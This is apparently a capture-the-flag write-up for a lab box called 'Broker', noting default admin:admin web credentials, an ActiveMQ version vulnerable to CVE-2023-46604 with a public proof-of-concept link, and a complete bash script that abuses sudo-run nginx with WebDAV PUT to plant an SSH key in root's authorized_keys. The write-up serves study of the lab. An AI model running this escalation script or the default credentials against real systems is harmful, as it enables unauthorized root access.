## Box: Broker

> damiano gubiani 

``` bash
export IP=10.10.11.243
```

# WebApp

admin:admin

> ActiveMQ version 5.15.15


# Vulnerable to CVE-2023-46604 

> PoC repo: https://github.com/rootsecdev/CVE-2023-46604


# PrivEsc PoC

``` bash
#!/bin/bash
echo "[+] making config"
cat <<EOF >/tmp/nginx.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	    listen 1341;
	    root /;
	    autoindex on;
	    dav_methods PUT;

	}
}
EOF
echo "[+] Launching..."
sudo /usr/sbin/nginx -c /tmp/nginx.conf
echo "[+] Creating ssh key"
ssh-keygen
echo "[+] copy file in the root ssh"
curl -X PUT 'http://localhost:1341/root/.ssh/authorized_keys' -d "$(cat root.pub)"
```
